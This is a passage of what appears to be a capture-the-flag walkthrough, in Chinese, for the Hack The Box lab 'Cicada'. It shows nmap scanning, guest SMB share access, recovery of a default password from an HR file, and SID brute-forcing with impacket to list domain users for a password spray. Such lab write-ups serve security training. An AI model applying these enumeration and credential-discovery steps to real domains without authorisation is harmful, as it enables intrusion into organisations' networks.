## Cicada
```
[★]$ nmap -sV -sC 10.129.45.27
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-25 09:31 CST
Nmap scan report for 10.129.45.27
Host is up (0.011s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-25 22:31:30Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-25T22:32:50+00:00; +6h59m26s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-25T22:32:50+00:00; +6h59m26s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-25T22:32:50+00:00; +6h59m26s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-25T22:32:50+00:00; +6h59m26s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-01-25T22:32:15
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m25s, deviation: 0s, median: 6h59m25s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```
```
[★]$ echo "10.129.45.27 cicada.htb" | sudo tee -a /etc/hosts
10.129.45.27 cicada.htb
[★]$ crackmapexec smb cicada.htb --shares
[*] First time use detected
[*] Creating home directory structure
[*] Creating missing folder logs
[*] Creating missing folder modules
[*] Creating missing folder protocols
[*] Creating missing folder workspaces
[*] Creating missing folder obfuscated_scripts
[*] Creating missing folder screenshots
[*] Creating default workspace
[*] Initializing MSSQL protocol database
[*] Initializing WINRM protocol database
[*] Initializing LDAP protocol database
[*] Initializing SMB protocol database
[*] Initializing SSH protocol database
[*] Initializing VNC protocol database
[*] Initializing WMI protocol database
[*] Initializing FTP protocol database
[*] Initializing RDP protocol database
[*] Copying default configuration file
SMB         10.129.45.27    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.45.27    445    CICADA-DC        [-] Error getting user: list index out of range
SMB         10.129.45.27    445    CICADA-DC        [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
```
#### 如果我们试图在不指定用户的情况下枚举共享，则会被拒绝。也许我们可以试试可能正在使用的一些典型凭据，例如没有密码的用户名guest
```
[★]$ crackmapexec smb cicada.htb -u 'guest' -p '' --shares
SMB         10.129.45.27    445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.45.27    445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.129.45.27    445    CICADA-DC        [*] Enumerated shares
SMB         10.129.45.27    445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.45.27    445    CICADA-DC        -----           -----------     ------
SMB         10.129.45.27    445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.45.27    445    CICADA-DC        C$                              Default share
SMB         10.129.45.27    445    CICADA-DC        DEV                         
SMB         10.129.45.27    445    CICADA-DC        HR              READ        
SMB         10.129.45.27    445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.45.27    445    CICADA-DC        NETLOGON                        Logon server share
SMB         10.129.45.27    445    CICADA-DC        SYSVOL                          Logon server share
```
#### 看起来我们是成功的，来宾用户可以访问HR共享。所以我们将使用Smbclient来查看共享并查看其中可能包含的文件。
```
[★]$ smbclient //cicada.htb/HR
Password for [WORKGROUP\syareya55]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 07:29:09 2024
  ..                                  D        0  Thu Mar 14 07:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 12:31:48 2024

		4168447 blocks of size 4096. 477708 blocks available
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (34.3 KiloBytes/sec) (average 34.3 KiloBytes/sec)
smb: \> exit
```
#### 使用dir命令列出内容，我们看到文件Notice from HR.txt，我们可以使用get命令将它下载到我们的机器上。查看文件会显示一个默认密码！
```
[★]$ cat 'Notice from HR.txt'

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
//
亲爱的新员工！

欢迎来到蝉公司！我们很高兴你能加入我们的团队。作为我们安全协议的一部分，您必须将默认密码更改为唯一且安全的密码。

您的默认密码是：Cicada$M6Corpb*@Lp#nZp！8

更改密码：

1. 使用上述提供的用户名和默认密码登录您的Cicada Corp帐户**。
2. 登录后，导航到您的帐户设置或配置文件设置部分。
3. 查找更改密码的选项。这将被标记为“更改Pas”
```
#### 既然我们已经找到了这个密码，我们可以试着检查是否有任何帐户仍在使用这个密码。要做到这一点，我们必须找出域中的所有用户，我们可以做到这一点使用Impacket的lookupsid模块。此工具将尝试暴力强制Windows安全AD域中所有用户的sid （identifier）。每个用户都有一个唯一的SID，它由它们的相对标识符（RID）与域SID相连接。用户sid通常由域控制器和域控制器都是用于授权和访问等机制的组成部分的访问
https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers
```
[★]$ impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at cicada.htb
[*] StringBinding ncacn_np:cicada.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
512: CICADA\Domain Admins (SidTypeGroup)
513: CICADA\Domain Users (SidTypeGroup)
514: CICADA\Domain Guests (SidTypeGroup)
515: CICADA\Domain Computers (SidTypeGroup)
516: CICADA\Domain Controllers (SidTypeGroup)
517: CICADA\Cert Publishers (SidTypeAlias)
518: CICADA\Schema Admins (SidTypeGroup)
519: CICADA\Enterprise Admins (SidTypeGroup)
520: CICADA\Group Policy Creator Owners (SidTypeGroup)
521: CICADA\Read-only Domain Controllers (SidTypeGroup)
522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
525: CICADA\Protected Users (SidTypeGroup)
526: CICADA\Key Admins (SidTypeGroup)
527: CICADA\Enterprise Key Admins (SidTypeGroup)
553: CICADA\RAS and IAS Servers (SidTypeAlias)
571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1101: CICADA\DnsAdmins (SidTypeAlias)
1102: CICADA\DnsUpdateProxy (SidTypeGroup)
1103: CICADA\Groups (SidTypeGroup)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1109: CICADA\Dev Support (SidTypeGroup)
1601: CICADA\emily.oscars (SidTypeUser)
```
#### 在结果中，我们找到了域内的组、用户和别名，这有助于我们理解它的整体结构。因为我们想要一个用户列表，所以我们将编译下面的所有项SidTypeUser类别。为了避免手动执行此操作，我们将使用一些参数重新运行该命令其他参数：我们使用grep指定只获取用户，使用sed删除任何文本除了名字。然后，我们将这些项传递到一个名为users.txt的文件中。
